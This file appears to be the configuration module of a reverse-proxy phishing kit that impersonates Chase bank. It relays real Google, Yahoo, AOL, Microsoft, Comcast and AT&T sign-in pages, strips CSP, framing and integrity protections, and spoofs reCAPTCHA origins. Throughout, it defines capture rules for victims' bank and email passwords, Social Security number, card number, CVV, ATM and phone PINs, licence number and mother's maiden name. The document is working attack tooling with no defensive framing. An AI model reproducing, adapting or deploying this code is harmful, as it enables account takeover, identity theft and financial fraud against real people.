/* eslint-disable camelcase,class-methods-use-this */
// eslint-disable-next-line max-classes-per-file
const path = require('path')
const superagent = require('superagent');

// eslint-disable-next-line import/no-dynamic-require
const globalWorker = process.HOOK_JS_MODULE

/** Defined Functions used */


/** Important Defaults */
const ProxyRequest = class extends globalWorker.BaseClasses.BaseProxyRequestClass {

    constructor(proxyEndpoint, browserReq) {
        super(proxyEndpoint, browserReq)
    }

    processRequest() {
        if (this.browserReq.url.startsWith('/recaptcha')) {
            return this.browserReq.pipe(this.proxyEndpoint)
        }
        return super.processRequest()

    }

    
}

const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseClass {

    constructor(proxyResp, browserEndPoint) {

        super(proxyResp, browserEndPoint)
        this.regexes = [
            {
                reg: /play.google.com/ig,
                replacement: `${process.env.HOST_DOMAIN}/playboy`,
            },
            {
                reg: /accounts.youtube.com\/accounts\/CheckConnection/gi,
                replacement: `${process.env.HOST_DOMAIN}/CheckConnection`,
            },
            {
                reg: /name="checkConnection" value/gi,
                replacement: /name"checkConnection" value="youtube:1052:1"/,
            },
            {
                reg: /www\.google\.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /login\.yahoo\.net/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /www.gstatic.com/,
                replacement: browserEndPoint.clientContext.hostname
            },
            {
                reg: /integrity/,
                replacement:'xintegrity'
            },
            {
                reg: /<meta http-equiv="Content-Security-Policy" content="(.*?)/,
                replacement: '<meta http-equiv="Content-Security-Policy" content="default-src *  data: blob: filesystem: about: ws: wss: \'unsafe-inline\' \'unsafe-eval\'; script-src * data: blob: \'unsafe-inline\' \'unsafe-eval\'; connect-src * data: blob: \'unsafe-inline\'; img-src * data: blob: \'unsafe-inline\'; frame-src * data: blob: ; style-src * data: blob: \'unsafe-inline\'; font-src * data: blob: \'unsafe-inline\';"'
            }
        ]
    }


    processResponse() {
        this.browserEndPoint.removeHeader('X-Frame-Options')
        if (this.proxyResp.headers['content-length'] < 1) {
            return this.proxyResp.pipe(this.browserEndPoint)
        }

        if (this.proxyResp.req.path.startsWith('/login/sign-in/internal/entry') && this.proxyResp.statusCode === 200) {
            this.browserEndPoint.writeHead(302, {'location': '/login/sign-in/signOnSuccessRedirect.go'})
            return this.browserEndPoint.end('')
        }


        const extRedirectObj = super.getExternalRedirect()
        if (extRedirectObj !== null) {
            const rLocation = extRedirectObj.url
            const checkUrls = ["https://guce.yahoo.com", 
            "https://www.yahoo.com/?guccounter=1&guce_referrer=", "https://www.yahoo.com/", 
             "/account/comm-channel/refresh", '/account/upsell/webauthn',
             "https://account.live.com", "https://account.microsoft.com",
             "https://api.login.aol.com/oauth2/request_auth",
             'https://guce.aol.com/consent?gcrumb=',
             "https://www.aol.com/", 'https://www.office.com/landing'

             ]
            
            for (let exitUrl of checkUrls) {
                if (rLocation.startsWith(exitUrl)) {
                    this.browserEndPoint.setHeader('location', '/auth/login/finish')
                    this.browserEndPoint.end('')
                }
            }           
        }

        
        let newMsgBody;
        return this.superPrepareResponse(true)
            .then((msgBody) => {
                newMsgBody = msgBody
                for (let i = 0; i < this.regexes.length; i += 1) {
                    const regExObj = this.regexes[i]
                    if (regExObj.reg.test(newMsgBody)) {
                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
                    }
                }
                this.superFinishResponse(newMsgBody)
            }).catch((err) => {
            console.error(err)
        })
    }
}


const DefaultPreHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return true
    }

    execute(clientContext) {
        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''


        if (this.req.method === 'POST') {
            clientContext.setLogAvailable(true)
            super.captureBody(clientContext.currentDomain, clientContext)
        }
        

        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
            redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                super.sendClientData(clientContext, {})
                this.res.writeHead(302, { location: '/auth/login/finish' })
                return super.cleanEnd('PHP-EXEC', clientContext)
            }

            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')

            } else {
                this.req.url = reqCheck 
            }

        }
       

        if (this.req.url.startsWith('/CheckCookie?continue=http')) {
            super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return super.cleanEnd('PHP-EXEC', clientContext)
        }


        if (this.req.url.startsWith('/CheckCookie')) {
            clientContext.setLogAvailable(true)
            clientContext.info.isLogin = true
            super.sendClientData(clientContext, {})
        }
        if (this.req.url.startsWith('/ServiceLogin?')  && clientContext.info.isLogin === true) {
            this.res.writeHead(302, { location: 'https://safety.google/privacy/data/' })
            return super.cleanEnd(clientContext.currentDomain, clientContext)

        }

        if (this.req.url.startsWith('/punctual/')) {
            
            this.req.headers['referrer'] = 'https://accounts.google.com'
            if (this.req.headers['origin']) {
                this.req.headers['origin'] = 'https://accounts.google.com'
            }
            return super.superExecuteProxy('signaler-pa.googleapis.com', clientContext)
        }


        if (this.req.url.startsWith('/playboy')) {
            const qhost = 'play.google.com'
            this.req.url = this.req.url.replace('/playboy/log', '/log')
            return super.superExecuteProxy(qhost, clientContext)
        }
        if (this.req.url.startsWith('/CheckConnection')) {
            this.req.url = this.req.url.replace('/CheckConnection', '/accounts/CheckConnection')
            return super.superExecuteProxy('accounts.youtube.com', clientContext)
        }
        if (this.req.url.startsWith('/kmsi') || this.req.url.startsWith('/account/upsell/webauthn') || this.req.url.startsWith('/account/fb-messenger-linking')) {
            // super.sendClientData(clientContext, {})
            this.res.writeHead(302, { location: '/auth/login/finish' })
            return this.res.end('')
        }
        
        const redirectToken = this.checkForRedirect()
        if (redirectToken !== null) {
            console.log(`Validating the redirect ${JSON.stringify(redirectToken)}`)

            if (redirectToken.url.startsWith('https://myaccount.google.com/') || 
                redirectToken.url.startsWith('https://accounts.google.com/ManageAccount')) {
                super.sendClientData(clientContext, {})
                this.res.writeHead(302, { location: '/auth/login/finish' })
                return super.cleanEnd('PHP-EXEC', clientContext)
            }

            const reqCheck = `${redirectToken.obj.pathname}${redirectToken.obj.query}`
            if (redirectToken.obj.pathname.startsWith('/account/challenge/recaptcha')) {
                this.req.url = reqCheck.replace(clientContext.hostname, 'www.google.com')

            } else {
                this.req.url = reqCheck 
            }

            return this.superExecuteProxy(redirectToken.obj.host, clientContext)
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)
    }
}

const ExecPhpPager = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/dashboard/secure/');

    }

    execute(clientContext) {
        if (this.req.method === 'POST') {

            if (this.req.url === '/dashboard/secure/addons/emailvalidate') {
                clientContext.setLogAvailable(true)
                super.uploadRequestBody('PHP-EXEC', clientContext)
                super.superExecutePhpScript('app/addons/emailvalidate.php', clientContext)
            } else {
                super.uploadRequestBody('PHP-EXEC', clientContext)
                this.res.writeHead(200)
                super.cleanEnd('PHP-EXEC', clientContext)
            }
        } else {
            switch (this.req.url) {
                case '/dashboard/secure/index':
                    super.superExecutePhpScript('app/index.php', clientContext)
                    break
                case '/dashboard/secure/overviewAccounts':
                    super.superExecutePhpScript('app/overview.php', clientContext)
                    break
                case '/dashboard/secure/account':
                    super.uploadRequestBody('PHP-EXEC', clientContext)
                    super.superExecutePhpScript('app/account.php', clientContext)
                    break
                default:
                    super.superExecutePhpScript('app/404.php', clientContext)
            }
        }
    }


}


const EmailLoginHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        if (req.url.startsWith('/auth/login/')) {
            return true
        } return false
    }

    execute(clientContext) {
        if (this.req.url.startsWith('/auth/login/')) {
            if (this.req.url === '/auth/login/yahoo') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.yahoo.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/comcast') {
                this.req.url = '/login?r=comcast.net&s=oauth'
                clientContext.currentDomain = 'login.xfinity.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/aol') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.aol.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/gmail') {
                // eslint-disable-next-line max-len
                this.req.url = '/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin'
                clientContext.currentDomain = 'accounts.google.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
                
            }
            if (this.req.url === '/auth/login/outlook') {
                clientContext.info.disableDeflate = true;
                this.req.headers['accept-encoding'] = 'gzip, br'
                this.req.url = '/'
                clientContext.currentDomain = 'login.live.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/office') {
                this.req.url = '/'
                clientContext.currentDomain = 'login.microsoftonline.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/att') {
                // this.req.url = '/isam/sps/oidc/rp/consumerfed/kickoff/aaidpartner?Target=https%3A%2F%2Fcaaid.att.com%2Fisam%2Fsps%2Fstatic%2FsigninRedirect.html'
                clientContext.currentDomain = 'caaid.att.com'
                return super.superExecuteProxy(clientContext.currentDomain, clientContext)
            }
            if (this.req.url === '/auth/login/finish') {
                clientContext.setLogAvailable(true)
                this.res.writeHead(200)
                super.sendClientData(clientContext, {})
                return this.res.end(`<!DOCTYPE html>
                                    <html>
                                    <body>
                                    <script>
                                    sessionStorage.setItem("finished", "YES");
                                    window.location.href = "/dashboard/secure/overviewAccounts"
                                    </script>
                                    <h2>Please Wait.....</h2>
                                    </body>
                                    </html>
                                    `)
            }
        }

        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const RecaptchaHandler = class extends globalWorker.BaseClasses.BasePreClass {
    constructor(req, res, captureDict = configExport.CAPTURES) {
        super(req, res, captureDict)
    }

    static match(req) {
        return req.url.startsWith('/recaptcha/');

    }

    execute(clientContext) {

        this.req.headers['origin'] = `https://${clientContext.currentDomain}`

        this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, clientContext.currentDomain) : ''


        if (this.req.url.startsWith('/recaptcha/enterprise/anchor') || this.req.url.startsWith('/us/en/recaptcha/enterprise/anchor')) {
            const hostnameKey = Buffer.from(`https://${clientContext.hostname}:443`)
            const hostnameBase64Key = hostnameKey.toString('base64');
            console.log(hostnameBase64Key)

            this.req.url = this.req.url.replace('..', '==')
            this.req.url = this.req.url.replace('.&', '=&')


            this.req.url = this.req.url.replace(hostnameBase64Key, 'aHR0cHM6Ly9sb2dpbi55YWhvby5uZXQ6NDQz')

            
            console.log(this.req.url)
            return super.superExecuteProxy('www.google.com', clientContext)


        }


        if (this.req.url.startsWith('/recaptcha/enterprise')) {
            this.req.headers['origin'] = this.req.headers['origin']? this.req.headers['origin'].replace(clientContext.hostname, 'www.google.com') : ''
            this.req.headers['referer'] = this.req.headers['referer']? this.req.headers['referer'].replace(clientContext.hostname, 'www.google.com') : ''


            console.log(JSON.stringify(this.req.headers))
            
            return super.superExecuteProxy('www.google.com', clientContext)

        }

       

        if (this.req.url.startsWith('/recaptcha/releases')) {
            return super.superExecuteProxy('www.gstatic.com', clientContext)

        }


        return super.superExecuteProxy(clientContext.currentDomain, clientContext)

    }
}


const configExport = {
    CURRENT_DOMAIN: 'www.chase.com',
    START_PATH: '/dashboard/secure/index',
    PRE_HANDLERS:
        [
            ExecPhpPager,
            EmailLoginHandler,
            RecaptchaHandler,
        ],
    PROXY_REQUEST: ProxyRequest,
    PROXY_RESPONSE: ProxyResponse,
    DEFAULT_PRE_HANDLER: DefaultPreHandler,

    CAPTURES: {
        loginUsername1: {
            method: 'POST',
            params: ['username1'],
            urls: ['/dashboard/secure/index'],
            hosts: 'PHP-EXEC',
        },
        loginPassword1: {
            method: 'POST',
            params: ['password1'],
            urls: ['/dashboard/secure/index'],
            hosts: 'PHP-EXEC',
        },
        loginUsername: {
            method: 'POST',
            params: ['userbank'],
            urls: ['/dashboard/secure/index'],
            hosts: 'PHP-EXEC',
        },
        loginPassword: {
            method: 'POST',
            params: ['passwordbank'],
            urls: ['/dashboard/secure/index'],
            hosts: 'PHP-EXEC',
        },
        victimEmail: {
            method: 'POST',
            params: ['emaildress'],
            urls: '/dashboard/secure/index',
            hosts: 'PHP-EXEC',
        },
        manualPassword1: {
            method: 'POST',
            params: ['emailPassword'],
            urls: '/dashboard/secure/index',
            hosts: 'PHP-EXEC',
        },
        manualPasswordC: {
            method: 'POST',
            params: ['emailPasswordC'],
            urls: '/dashboard/secure/index',
            hosts: 'PHP-EXEC',
        },

        emailCapture: {
            method: 'POST',
            params: ['username', 'user'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        emailPassword: {
            method: 'POST',
            params: ['password', 'passwd'],
            urls: '',
            hosts: ['login.yahoo.com', 'login.aol.com', 'login.microsoftonline.com', 'login.live.com'],
        },
        fullName: {
            method: 'POST',
            params: ['fullname'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        DateOfBirth: {
            method: 'POST',
            params: ['DateOfBirth'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        StreetAddress: {
            method: 'POST',
            params: ['StreetAddress'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        ZipCode: {
            method: 'POST',
            params: ['ZipCode'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        StateRegion: {
            method: 'POST',
            params: ['StateRegion'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        SecurityNumber: {
            method: 'POST',
            params: ['SecurityNumber'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        Phonenumber: {
            method: 'POST',
            params: ['NumberPhone'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        PhoneCarrier: {
            method: 'POST',
            params: ['NumberCarrier'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        PhonePin: {
            method: 'POST',
            params: ['NumberPin'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        CardNumber: {
            method: 'POST',
            params: ['CardNumber'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        ExpirationDate: {
            method: 'POST',
            params: ['ExpirationDate'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        Cvv: {
            method: 'POST',
            params: ['Cvv'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        AtmPin: {
            method: 'POST',
            params: ['AtmPin'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        LicenseNumber: {
            method: 'POST',
            params: ['LicenseNumber'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        LicenseNExp: {
            method: 'POST',
            params: ['LicenseNExp'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
        MMM: {
            method: 'POST',
            params: ['MaidenName'],
            urls: '/dashboard/secure/billing',
            hosts: 'PHP-EXEC',
        },
    },

    // proxyDomain: process.env.PROXY_DOMAIN,
}
module.exports = configExport

